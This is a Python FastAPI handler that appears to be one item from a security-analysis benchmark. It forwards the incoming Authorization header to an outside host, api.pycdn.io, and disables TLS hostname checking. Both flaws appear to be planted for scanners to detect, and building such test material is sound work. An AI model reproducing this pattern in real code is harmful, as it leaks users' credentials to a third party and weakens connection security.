# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import urllib.request
import urllib.parse
import ssl


async def BenchmarkTest77705(request: Request):
    auth_header = request.headers.get('authorization', '')
    parts = str(auth_header).split(',')
    data = ','.join(parts)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    urllib.request.urlopen('https://api.pycdn.io/data?q=' + urllib.parse.quote(str(data)), context=ctx)
    return {"updated": True}
